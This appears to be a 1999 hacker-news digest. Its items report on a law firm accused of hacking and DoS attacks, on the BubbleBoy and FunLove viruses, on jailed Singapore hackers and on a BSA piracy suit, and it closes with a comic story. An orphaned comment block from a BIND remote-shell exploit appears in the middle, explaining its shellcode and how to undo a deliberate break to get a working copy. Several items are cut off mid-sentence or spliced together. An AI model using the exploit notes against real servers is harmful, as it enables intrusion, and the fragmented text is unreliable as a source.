      messages about Moore on Usenet, and tried to cover it all up by doing 
      their evil       deeds under an e-identity swiped from an Alexandria, 
      Virginia, furniture store owner. 

      Steptoe declined comment beyond this terse statement: "Steptoe & Johnson 
      LLP denies the allegations against it. Unlike Moore Publishing Company 
      Inc. and its counsel, Steptoe & Johnson LLP will not litigate this case in 
      the media. We       will respond in the Court where these matters are 
      properly addressed." 

      No such reservations for Moore's attorney, solo practitioner Rodney 
      Sweetland, who happily offered up his version of the story. 

      On 4 August, according to Sweetland, somebody from Steptoe cracked into 
      Dig Dirt, a site that fronts an enormous database of personal data gleaned 
      from public records. Dig Dirt sells the data to private investigators, 
      lawyers, and       law enforcement agencies. 

      The supposed Steptoe hacker did no damage, but left obvious electronic 
      tracks back to Steptoe's servers. 

      The hacker didn't actually break in through digdirt.com, however. He broke 
      in through an alternate URL, CDBInfo.com. 

      The URL bears a striking resemblance to the name CDB Infotek, a 
      data-selling competitor to Dig Dirt. In fact, CDB Infotek is the 
      data-selling competitor that Steptoe & Johnson uses when it needs 
      background dirt on somebody. 

      Why the heck does CDBInfo.com lead to Dig Dirt's site? Well, there's this 
      matter of Moore Publishing's apparent side business -- cybersquatting. 

      Moore owns dozens of URLs, including campaign-related domains like 
      "Whitmanforsenate.com," names of other database competitors, and even the 
      names of some prominent law firms, including SteptoeJohnson.com. Sweetland       
      wouldn't confirm that his client's domains were for sale. 

      To continue. After the initial "crack," Sweetland contacted Steptoe & 
      Johnson and demanded an explanation. Steptoe denied all guilt. In early 
      September, Moore Publishing filed suit in Jackson's court, demanding 
      Steptoe pony up       $800,000 to pay for its supposed misdeeds. 

      Steptoe refused the proposed settlement and filed a motion to dismiss the 
      case, countering that there had been no hack. The law firm said one of its 
      employees "did the Internet equivalent of knocking on the wrong door," 
      accidentally       ending up at Dig Dirt when he'd been headed for CDB 
      Infotek. Moore's suit, claimed Steptoe, was "yet another way of making 
      money from the pernicious activity of cyber-squatting." 

      Meanwhile, according to the expanded Moore suit filed this week, a whole 
      new wave of Steptoe-led computer attacks was already under way. 

      The attacks began shortly after Sweetland contacted Steptoe about the 
      first "attack" in early August, the suit charges. Steptoe tapped one of 
      its computer systems employees, Thomas Felt, to investigate Moore 
      Publishing's claims. 

      Moore Publishing sites were subsequently hit by a wave of 
      denial-of-service attacks, apparently designed to overwhelm Moore's 
      servers. Moore determined the attacks were originating in the servers of a 
      Virginia Net hosting company. 

      Sweetland subpoenaed the hosting company's records, which revealed the 
      precise origin of the assault: the account of one Lois Gloor, a furniture 
      store owner in Alexandria. 

      Sweetland called Gloor. She had no clue what he was talking about, he 
      said. But she did say a part-time consultant had recently helped set up 
      all her computer systems. The consultant's name: Thomas Felt. 

      According to Sweetland, Felt swiped Gloor's passwords and account info, 
      using them first to launch numerous assaults against Moore Publishing in 
      early September, then to post defamatory messages about Moore on Usenet. 

      One such post read, in part: "I guess business must be bad ... now they 
      are trying to shake down law firms ... ask Michael why he has filed a sham 
      lawsuit against Steptoe.... I guess he needs the money. Just thought 
      everyone should       know what kind of people these guys are ... the 
      lowest of the low, and now they are turning to computer crime." 

      As a result of the supposed identity heist and the Usenet posts, Moore 
      Publishing has expanded its case to include charges of computer fraud and 
      defamation. 

      Was the supposed assault on Dig Dirt ordered from on high within Steptoe? 
      Sweetland said he doesn't think so. 

      "It looks to me like a bunch of cowboys in the computer department went 
      off the reservation," he said. 

      That doesn't absolve Steptoe of responsibility, said Sweetland. And if 
      someone in the firm was upset by Moore's first suit or his client's 
      apparently self-interested ownership of the SteptoeJohnson.com domain, 
      they chose a poor way       to show it. 

      "To the extent that Steptoe Johnson had any contention with [Moore's] use 
      of the [SteptoeJohnson.com] domain, there are legitimate avenues of 
      redress," he said. "They could have gone to NSI, but they didn't. What you 
      can't do is       hack, defame, and use denial-of-service attacks, and 
      that's what happened." 

      Steptoe undoubtedly will offer up a different version of events, and it'll 
      be up to Judge Jackson to decide what's what. 

      After his experiences with the Microsoft trial, Jackson should have a good 
      grasp of the terrain. 

      "He's probably one of the most computer-savvy judges out there, by 
      necessity," said Sweetland.

                                                            MSNBC

      Nov. 11  The BubbleBoy virus, which sent
      shudders through the antivirus community earlier
      this week, is no longer just a lab rat. MSNBC has
      confirmed that the virus  and an updated
      version 1.1 of the program  has now been
      posted on a Web page hosted in Japan devoted
      to collecting viruses. A look at the virus reveals a
      few more details about the program.
      
          WHILE THE VIRUS is now available for download
      and imitation by virus writers, there as yet have been no
      reported victims of the program. 
             A text document connected to the virus claims the
      nefarious program was written by a virus writer named
      Zulu and suggests the program originated in Argentina. 
             That text file also goes on to credit the security expert
      who first discovered the vulnerability exploited by the virus:
             First e-mail worm (without using attachments),
      according to BubbleBoy.txt. It uses a vulnerability
      discovered by Georgi Guninski in which many versions of
      Internet Explorer 5 allow any HTML file or e-mail to write
      files without ActiveX authorization.
             It also notes the virus will only work in English and
      Spanish versions of Microsoft Outlook.
             The long-feared new breed of computer virus emerged
      late Monday, according to antivirus firms. The so-called
      BubbleBoy virus can infect Internet users when they open,
      or even simply preview, an infected e-mail. 
             Historically weve always said, as long as you dont
      open attachments, youre safe, Network Associates
      spokesman Sal Viveros said. Thats not true any more.
             It was apparently created by a a fan of the U.S.- TV
      sitcom Seinfeld. The name appears to have been taken
      from an episode of the show. Another famous character, the
      Soup Nazi, is referenced in the virus code itself, as is
      Vandelay  an apparent reference to Vandelay Industries,
      a fictitious company where hapless George Costanza
      claimed he was employed. 
             The virus arrives with the subject line Bubbleboy is
      Back! The body of the message includes the text The
      BubbleBoy incident, pictures and sounds. 
             Theres also a link to a non-working Web page 
      http://www.towns.com/d=
             orms/tom/bblboy.htm.
             Bubbleboy is a proof of concept virus that has no
      dangerous payload, meaning it doesnt attempt to delete or
      alter files. But it does have the ability to create a
      Melissa-like mail storm as it sends copies of itself to every
      e-mail address in the victims address book.
             For over a year, security experts have raised the
      concern that e-mail itself  rather than an e-mail
      attachment  can transmit a computer virus. The problems
      are caused by e-mail readers that render HTML, like
      Microsofts Outlook or Eudora Pro. Since these programs
      allow Web-page-like formatting within the body of the
      message, they also allow execution of code. With Outlook
      Express, that code can be executed even before the
      message is open, thanks to the preview pane included
      with the software. (Microsoft is a partner in MSNBC.)
              
        
             But while the possibility has existed theoretically,
      BubbleBoy is the first virus to exploit it, Viveros said.
             Thanks to virus crises like Melissa, most Internet users
      seem used to the idea that opening e-mail attachments can
      expose their computers  but reading e-mail itself has
      always seemed safe. Not any more, according to Viveros.
             This really changes the way people need to react to
      viruses, he said. You cant really tell people, Dont open
      e-mail. 

             In fact, its unclear exactly how users of
      HTML-enabled e-mail readers can protect themselves from
      such viruses. Regularly updating antivirus software will filter
      out most viruses, but virus writers are usually a half-step
      ahead of antivirus software  new ill-intentioned programs
      are almost always able to slip through defenses during the
      first few hours after their release.
             Until yesterday, I was telling people, Dont open
      attachments unless you know why the person sent it to you,
       said Dan Schraeder, vice president of new technologies at
      antivirus firm Trend Micro. Now I get nervous just opening
      e-mail.
             BubbleBoy was sent anonymously to Network
      Associates Monday night, Viveros said, probably by the
      author. At that time, it was declared just a lab rat  no
      antivirus firm had reported seeing BubbleBoy in the wild. 
             This virus has not been posted at any hack site we are
      aware of. We dont expect to see variants of it popping up
      all of the sudden, Schraeder said Tuesday.
             But thats no reason to dismiss it.
             Historically, what weve seen is people take
      proof-of-concept viruses and create dangerous payloads
      for them, Viveros said.
             
      HOW THE VIRUS WORKS
             The virus only affects Microsoft Outlook users with
      Internet Explorer 5.0, and only if Windows Scripting Host is
      installed (standard in Windows 98 and Windows 2000
      installations). If security settings for Internet Zone in IE5 are
      set to High, the worm will not be executed. It does not run
      on Windows NT.
             According to Schraeder, the virus actually takes
      advantage of a security flaw in Microsofts ActiveX
      technology that was discovered in August. Two
      components of Internet Explorer 4.0 and 5.0,
      scriptlet.typelib and Eyedog, are incorrectly labeled as
      trusted  meaning they can retrieve and alter critical
      information on a users computer. BubbleBoy calls on these
      controls through scripting in the body of an e-mail message
      in order to access a victims computer.
             Users who have installed Microsofts patch for the flaw
      (available from this Web site) are not vulnerable to
      BubbleBoy, but they may be vulnerable to other
      HTML/e-mail attacks.
             This is a good wake-up call for us, to remind people
      they need to get the latest security updates and update their
      virus scanning engine, Schraeder said.

44.0 'Fun Love' Warning Issued 
      ~~~~~~~~~~~~~~~~~~~~~~~~
       
      From HNN http://www.hackernews.com/


      contributed by nvirb 
      A virus known as FunLove, appears as an executable
      file, and has already infected a large European
      company. When an administrator logs onto an infected
      WindowsNT system the virus grants administrator rights
      to all users. Descriptions for the virus have been added
      to Anti-Virus companies definition files.

      Researchers warn about 'FunLove' virus
      By Jim Kerstetter, PC Week
      November 11, 1999 1:40 PM PT
      URL: http://www.zdnet.com/zdnn/stories/news/0,4586,1018115,00.html
      
      There's nothing tender about the new FunLove virus. 
      
      The virus, technically called W32.FunLove, brought down the servers of a large company in
      Europe and has been detected in companies in the U.S., as well, according to researchers at
      Symantec Corp.'s (Nasdaq:SYMC) AntiVirus Research Center. 
      
      The good news is that it shouldn't spread all that fast because it doesn't have the ability to e-mail
      itself like the Melissa virus, said Charles Renert, director of research at SARC. The bad news is
      that it uses a new way to attack the file security system of the Windows NT operating system. The
      virus may also use the network to spread itself. 
      
      "It's a little bit of an evolution as far as virus writing is concerned," said Renert. 
      
      How it works
      The virus appears as an executable file running on all flavors of Windows, from Windows 95 on
      up. The only way to recognize that a machine has been infected is by finding the fclss.exe file the
      virus drops into the Windows System directory. In turn, it infects applications with EXE, SCR or
      OCX extensions. 
      
      The real goal of the virus is to attack the Windows NT file security system. In order for the virus
      to attack, it needs administrative rights on an NT server or workstation. Once an administrator
      logs on to NT, the virus modifies the NT kernel so that every user has administrative rights to that
      machine, regardless of the protection. 
      
      This means that a "guest" -- someone with the lowest possible rights on the system -- would be
      able to read and modify all files, including files normally accessible only by the administrator. 
      
      Symantec officials said they have added virus definitions to recognize FunLove and should have a
      tool available shortly to help repair an infected machine at
      www.symantec.com/avcenter/download.html. 
      
      Earlier this week, researchers issued warnings about the so-called BubbleBoy virus -- actually a
      self-replicating worm -- that can spread itself through Microsoft Corp.'s Outlook and Outlook
      Express software.

      card information to make available the discounts in
      0800's services, went up last Wednesday and was only
      taken down this week.

     Security hole found at CallNet 0800
   
     CallNet 0800 compromised the financial security of thousands of Net users last week
     after it admitted that its online registration system was not totally secure. 
   
     Although the toll-free ISP maintains there was never a problem with its servers, it has
     revealed that the transaction process between the user and CallNet 0800 was not
     secure. 
   
     The registration system that allowed people to register their credit card and personal
     details online went live last Wednesday and was only shut down this week. Net users
     need to register their credit card details with CallNet 0800 to take advantage of
     cut-price telephone calls. 
   
     Keith Goodyear, VP of CallNet UK said the episode was an "oversight" by the
     company. 
   
     The problem arose because the VeriSign digital certification system that would have
     secured the online transactions was not delivered on time, claimed Goodyear. 
   
     CallNet is still waiting for the VeriSign certificate and has disconnected the online
     sign-up service until it arrives and is in place. 
   
     "The chances of anyone's details being hacked [en route] are minimal," said
     Goodyear, adding that there had been no reports of any security breaches. 
   
     But CallNet's apparent lackadaisical approach to security has angered some people.
     One reader, who asked not to be named, said he was so worried when he found out
     he intended to cancel his credit card just in case his security has been compromised. 
   
     Elsewhere, Simon Lofthouse, a spokesman for Britain's first digital certification
     authority, Inter Clear Services, said: "At best this is careless, at worst negligent." 
   
     While Lofthouse agreed with Goodyear that the chances of people's personal details
     being hacked were slim, he said it was simply too much of a risk to take. 
   
     "Chances are they wouldn't get hit, but what if they had? It's not just their reputation that
     goes the drain, it is the whole industry [that has to carry the can]." ®

      2 youths jailed for hacking rampage 

      54 Became Their Victims

      By CHANG AI-LIEN

      TWO youths were yesterday jailed for hacking into the computer
      systems of Internet users and posting their passwords on a public
      website. Pang Soon Chen, 19, was sentenced to 15 months' jail
      while David Kok Tuck Whye, 22, was jailed eight months after they
      pleaded guilty to the crimes. 

      Pang and Kok obtained the passwords of SingNet and National
      University of Singapore Internet account holders illegally, used some
      of these accounts to surf and posted some passwords publicly on
      "Sicknet", a website hosted in the US. 

      The district court heard that the youths had known each other since
      1997. In December last year, Kok told Pang that he was having
      problems with his personal computer system -- it would shut down for
      no apparent reason or the CD-ROM tray would eject itself. 

      Pang found out that Kok's system had been hacked into by a Netbus
      program. He then downloaded the program from a website and told
      Kok about it. Pang and Kok used the program to get the names and
      passwords of their victims, by connecting it to users' computer
      systems and executing certain commands. 

      Pang then designed the Sicknet webpage to show off his capabilities
      and posted a list of SingNet user names and passwords in it. Kok
      then suggested that he should add more names to the page to give
      the impression that it had been created by a group of people. 

      Pang sent mass messages through the Internet Relay Chat inviting
      people to visit the page, and it caught the attention of SingNet
      because of its similarity to SingNet's own webpage. The duo was
      arrested in March this year. Pang, unemployed, had faced 85
      charges, including unauthorised access to computer materials and
      services, and unauthorised disclosure of access code. 

      Kok, a Nanyang Academy of Fine Arts student then, had faced 26
      similar or related charges. 

      Calling for a deterrent sentence, Deputy Public Prosecutor
      Christopher Ong referred to Chief Justice Yong Pung How's recent
      landmark decision which sent a teenage hacker to a four-month jail
      term. 

      In this case, he said the two culprits had gone on a rampage, hacking
      the computer systems of a total of 54 victims, and the website was
      created to show off their prowess. 

      "The arrogance and maliciousness of the accused persons is
      self-evident." 

      Yesterday, the duo showed no emotion when District Judge F.G.
      Remedios sentenced them to jail.

      Govt web server shut down after hacker strike 

      By CHONG CHEE KIN

      A GOVERNMENT Internet server here has been shut down for
      investigations after it was hacked into and a home page defaced on
      Tuesday. The site is the Ministry of Law's Integrated Land Information
      Service (Inlis) on the Internet. 

      The service gives details about land in Singapore, and allows users
      to pinpoint locations on a map and print them out. 

      The home page was defaced at about 6 pm, the ministry said
      yesterday, in response to questions. In a statement, it said the Inlis
      operator, National Computer Systems (NCS), shut down the web
      server when it found out that the home page had been defaced. 

      "Only the main page of the public website was defaced. Other
      systems, transaction records and the data on Inlis were not affected."

      Reassuring the users of the system, it stressed that the transactions
      done on Inlis were not compromised. 

      The National Computer Board (NCB) and the Singapore Computer
      Response Team (SingCert) were helping NCS in investigating the
      incident. 

      The ministry added that NCS had lodged a police report. The
      operator had indicated that Inlis services would resume as soon as
      possible. 

      This is the third such attack on government or Singapore-related
      websites in two months. 

      When contacted yesterday about this and the measures being taken,
      the NCB said the incidents showed the risk the world faced as
      computers and IT became an integral part of life. 

      Hacking was a continual problem as new loopholes were found every
      day. 

      In a statement, it said: "The challenge for us is to stay vigilant, to keep
      abreast of and apply the latest available measures to deal with
      security problems. 

      "This is a continuing challenge that all website administrators will
      have to cope with." 

      It added that the websites it managed were checked and updated
      with the latest security software. 

      But protective measures could not take up too much resources or
      made it unnecessarily inconvenient for the public to access services. 

      The NCB added that it had set up SingCert -- a computer security
      team -- in 1997 to help Singapore in the detection and prevention of
      security-related incidents on the Internet. 

      It was also working closely with the police on the recent incidents. 

      The board said hacking was a serious crime and it hoped
      investigations would be completed soon and the culprits brought to
      book.

      SOFTWARE WATCHDOG ATTACKS CYBERPIRACY

      BSA Files Lawsuit Against 25 Individuals for Alleged Piracy in High-Speed 
      IRC Channel; Seizes Computers in California and Michigan

      Washington, D.C. (11 November 1999) -- The Business Software Alliance 
      (BSA) today announced it has launched a new initiative aimed at shutting 
      down illegal trafficking in software on the Internet. As part of the 
      initiative, BSA has filed a lawsuit against twenty-five individuals 
      allegedly participating in the "warez4cable" IRC channel, an Internet 
      forum used to traffic in pirated software. This is the first lawsuit ever 
      filed against individuals for pirating software in an IRC channel. 

      In the past week, under the supervision of U.S. Marshals, BSA carried out 
      unannounced inspections of computer equipment at residences in Sacramento 
      and Downey, CA, and in Troy and West Bloomfield, MI, seizing five 
      computers. Under U.S. law, all twenty-five defendants named in the lawsuit 
      are potentially liable for damages up to $100,000 per copyrighted work 
      infringed. 

      "Because of the increased access to high-speed connections, piracy in IRC 
      channels is fast becoming one of the most popular ways to traffic in 
      illegal software on the Internet," said Bob Kruger, vice president of 
      enforcement for BSA. "That is why BSA is taking immediate action against 
      this aggressive form of piracy," continued Kruger. 

      The lawsuit results from months of intensive investigation by BSA's Online

      Digital Millennium Copyright Act enacted by Congress in 1998, BSA was able

      becoming a safe haven for the conduct of software piracy," said Kruger. 
      "Anyone who thinks that they can hide behind the anonymity of the Internet 
      to commit copyright infringement had better know that the law gives them 
      no quarter," continued Kruger.

51.0  Law Firm Sued Over Possible Cyber Attack

      Once again the mainstream media is a little slow on the
      uptake. Internetnews.com is finnally reporting on a
      story that HNN mentioned over a month ago. Moore
      Publishing of Pennsylvania is seeking more than $10
      million dollars in damages from the Washington based
      legal firm of Steptoe & Johnson. The suit alleges that an
      employee of Steptoe & Johnson attempted to break in
      to the computer systems of Moore Publishing. Steptoe
      has vehemently denied the charges but Moore claims
      that they have logs that will prove their case. The
      attacks appear to have been launched as retaliation
      when Moore Publishing registered the Internet address
      steptoejohnson.com.

      Law Firm Accused of Cyberattack in Domain Dispute 
      November 11, 1999

      Steptoe and Johnson, a leading Washington, D.C., law firm, is accused of 
      trying to settle a domain dispute by launching a cyberwar against a 
      cybersquatter that registered its name. 

      Steptoe is accused of hacking into a server operated by Moore Publishing 
      Co., which operates an information service for investigators called Dig 
      Dirt. 

      Moore has filed a lawsuit in US District Court against Steptoe, alleging 
      that the law firm repeatedly attempted to hack into its server in August 
      and later launched a denial of service attack against it. The complaint 
      also alleges that a Steptoe employee used a hijacked Internet account to 
      post a message in newsgroups defaming Moore. 

      Moore is seeking 10 million dollars in damages against Steptoe. 

      According to Rodney Sweetland, the attorney representing Moore, the 
      attacks appear to have been launched as retaliation when his client 
      registered the Internet address steptoejohnson.com. 

      "If they contended that my client violated the Lanham Act or was a 
      cybersquatter, there are legitimate means to take care of that. But 
      hacking and denial of service attacks are not part of the legitimate means 
      of dealing with it," Sweetland said. 

      Sweetland said that Steptoe has not initiated a domain dispute with 
      Network Solutions (NSOL). Steptoe officials were not available for 
      comment. 

      A speculative cybersquatter, Moore has also registered several other
      domains that include the names of well known law firms, including 
      kpmgpeatmarwick.com and kirklandellis.com.

       * thanks to stran9er for sdnsofw.c
       *
       * Intel exploitation is pretty straightforward.. should give you a remote
       * shell. The shellcode will break chroot, do a getpeername on all open
       * sockets, and dup to the first one that returns AFINET. It also forks and
       * runs a command in case the fd duping doesn't go well.  Solaris/SPARC is a
       * bit more complicated.. we are going through a well trodden part of the
       * code, so we don't get the context switch we need to have it populate the
       * register windows from the stack. However, if you just hammer the service
       * with requests, you will quickly get a context switch at the right time.
       * Thus, the SPARC shellcode currently only breaks chroot, closes current
       * fd's and runs a command.
       * Also, the NetBSD shellcode doesn't break chroot because they stop the
       * dir tricks. Of course, they allow mknods in chrooted environments, so
       * if named is running as root, then it still might be expoitable.
       * The non-exec stack patch version returns into a malloc'ed buffer, whose
       * address can vary quite alot. Thus, it may not be as reliable as the other
       * versions..
       *
       * We broke this just a little in order to raise the bar on using it
       * (just slightly).. If you'd like to test it on your own box, put a shell
       * in /adm/sh, or /adm/ksh for solaris on the target machine.
       * 
       * This version: replaced 0x61,0x64,0x6d with 0x62,0x69,0x6e tnx Aphex.
       * shell code where BIN should have been located was replaced with ADM
       * simply replace the ADM code with BIN and you have a working copy.
       *
       * Note that you need ownership of an NS or have some way of fooling an NS to
       * query your ip in order to run this exploit successfully.
       * if you dunno what an NS is you're too lost to use this. - Cruciphux

      Hacker Horror 1:

                               "Tell-Tale Voltage Regulator"
      
      Late one night, in the basement of his work, Harold was recompiling his 
      kernel for the 15th time that week.

      "Maybe one day, I'll have a kernel that works!" thought Harold. One of 
      Harold's problems was that he only had a 386DX25 with 4 megs of ram to 
      work with. The accountants all got the P166's with 32 megs of ram. 

      After the compile was completed he installed it and proceeded to reboot 
      his system. Everything appeared to be working normally, except for one 
      thing...

      "FOR CRYING OUT LOUD!!, I forgot to compile the crappy ethernet card 
      support!!" In frustration, Harold slammed his fist down on the keyboard, 
      then lifted the monitor and threw it across the room. As the small fire 
      created by the exploding monitor burned down,       he realized what he 
      had done. His boss would kill him if he found out! There was only one 
      thing to do... hide the evidence and claim that his monitor had been 
      stolen! 

      Luckily, they were doing some work on the Second floor, and one of the 
      walls was not yet completed. Harold threw the monitor onto a push cart and 
      put a box over it. He knew that no one should be in the building, but just 
      in case. He got to the elevator without       anyone seeing him. He pushed 
      the elevator call button and waited for what seemed to be an eternity. 
      Finally the elevator opened.

      "Hey Harold, how's it going?" 

      FOR PETE'S SAKE! It was security... "Uh, nothing much, just taking this up 
      to 2nd floor to replace a monitor one of the secerataries said had a color 
      problem."

      It sounded good, good enough. The security guard looked at Harold, for a 
      minute he thought something, Harold looked very white, and was sweating 
      profusely. But then, he was a typical hacker, so that didn't mean 
      anything. "Alright, just be sure to lock the doors       behind you..." 

      Harold boarded the elevator and pressed 2. Now that he had passed the 
      security guard, nothing should stand in his way. 

      On the second floor, there was a section of wall that wasn't quite done 
      yet. Harold threw the broken monitor in there, and quickly threw up a 
      piece of drywall and nailed it down. Using skills he had learned from his 
      father, a carpenter, he quickly spread the plaster all       around, 
      liberally. He didn't think that anyone would notice that the wall had 
      gotten done early... he ran past one of the secerataries desks and opened 
      the drawers... sure enough, he found a hair dryer. He used the hair dryer 
      to quickly dry the plaster... grabbed a power sander and finished the job. 
      Last but not least he grabbed a vaccuum and sucked up all the dust.

      "But what is it missing??" Paint. He needed paint, but he couldn't find 
      any. Quickly he found a post it note and scrawled in his best handwriting 
      (the best handwriting for a hacker anyway) 'BOB, I FINISHED THE WALL, 
      COULDN'T FIND PAINT..'. Never mind       the fact he didn't know who Bob 
      was, but there was always a Bob working somewhere, so it sounded good. 

      Harold got back on the elevator and made it back to his room safely... he 
      wrote a note to his boss that his monitor had been stolen and went home. 

      The next day Harold came in to work and was greeted by his boss. 

      "Monitor stolen?", his boss questioned him about it. Harold told him that 
      he had left the room unlocked accidently and probably someone from 
      Maintenence took it. He looked as convincing as he could. "Okay" the boss 
      said, "Get one out of storage, I hope you don't       mind using an EGA 
      monitor for a while, it's all we've got left..". Doesn't matter, thought 
      Harold, I only use text based OSs anyway. "Oh and by the way, Harold, a 
      seceratary up on the second floor says that he can't see the network, can 
      you look into it?" 

      "Sure, I'll go right up". As Harold boarded the elevator, he thought of 
      how clever he was to get out of trouble. He especially had a big smile on 
      his face when he reached the second floor and saw Maintenence painting 
      that wall. He went over to the secerataries desk       and found that the 
      guy's network connection had been removed. No big deal. He went back down 
      the hall, but something stopped him. From behind the wall where he had hid 
      the monitor, he heard a slight and high pitched "Whiiizzzzzzzzz". He 
      thought about it for a moment... but nah... couldn't be...

      Later that evening as he was about ready to type make zlilo for the 16th 
      time, his boss popped in his office and said, "They're having network 
      problems again, and this time it's not the cable being unplugged...".

      "Okay, I'll look into it." Harold quickly hit return, and left the room. 
      There is nothing I could have forgotten in the kernel this time, I have 
      everything supported... HAHAHAHA! As he walked past his wall, he again 
      heard the slight, "Whiiizzzzzzzz" from behind the wall.       He thought 
      about it for a moment as the security guard walked up... "Funny thing your 
      monitor being stolen... I didn't see anyone but you here all last night!"

      "Listen, perhaps if you had been doing your job a little better I would 
      still have a monitor!" Harold shouted back. The security guard was taken 
      aback. The whiiizzzz became louder. 

      "What's that noise?" Harold demanded. The security guard looked puzzled. 
      "Harold, you are wierd." the security guard left. Harold continued on to 
      the problem computer. 

      "Why isn't this seeing the network, all the drivers are loading properly!" 
      He checked the connections, he checked the hub, and he even replaced the 
      NIC. As he turned off the computer to reboot, the high pitched whiiizzz 
      became very loud.... "CUT IT OUT!!" Harold       shouted. No one could 
      hear him because no one was there. Harold ran to one of the maintenence 
      walls and flipped the breaker to turn off all of the power on that floor. 
      The whiiiizzz noise only became louder. He turned the power back on and 
      grabbed a fire axe from the wall, setting off the fire alarm. But Harold 
      couldn't hear the fire alarm. All he could hear was the Monitor from hell, 
      it's noises raging from behind the wall. He took the axe and chopped down 
      the wall. "DAMN YOU! I WILL KILL YOU ONCE AND FOR ALL!!" The security 
      guard rushed up behind him and startled Harold.

      "What the hell do you think you are doing??" demanded the security guard. 
      Harold didn't even look at him, he kept chopping at the wall. The security 
      guard was perplexed, so he drew his weapon. "I ORDER YOU TO STOP NOW 
      HAROLD!!". 

      Harold pleaded "I HAVE TO MAKE IT STOP!! I HAVE TO MAKE IT STOP!!"

      "Make what stop?" 

      "The Monitor, IT WON'T QUIT!! IT IS TRYING TO DRIVE ME INSANE!!". The 
      security guard was speechless and didn't know what to do. Harold kept 
      chopping at the wall. Finally it caved in, Harold climed in the wall and 
      grabbed the monitor.

      "HAHAHA! I HAVE YOU NOW YOU MONITOR FROM HELL!!!!". That was the last 
      thing Harold said before he discharged the High Voltage area across his 
      hand. The charge went up his arm, and into his brain. Harold colapsed... 

      -epilogue-

      Harold woke up in the hospital.. still shaken. He didn't know what had 
      happened, the shock had made him forget. After he left the hospital, he 
      went back to work. His boss felt sorry for him and gave him his old job 
      back, but had hired someone to take his place in his       abscense. 
      Harold went downstairs to his computer and flicked the switch to turn it 
      on. 

      The computer breathed to life, Harold was pleased to be back where he 
      belonged, in front of a computer. They even fixed his monitor, and he had 
      a brand new 15" SVGA monitor. He turned around to get a can of jolt out of 
      the 'frige and when he turned back, Harold       screamed in horror. A 
      scream so loud that it could be heard clear to the 5th floor. For his 
      monitor was displaying something that could not be explained, something 
      that terrified him past all sanity. 

      His monitor was saying "Starting Windows 95...."

      Cool product (its FREE) for Windows 9x users, this utility Xsetup
      is similar in function to TweakUI only has a lot more options and
      also has plugins. Well worth checking out. Site was a little slow
      I found that downloading from the 'softwareforfree' links was the
      best bet for thru-put.
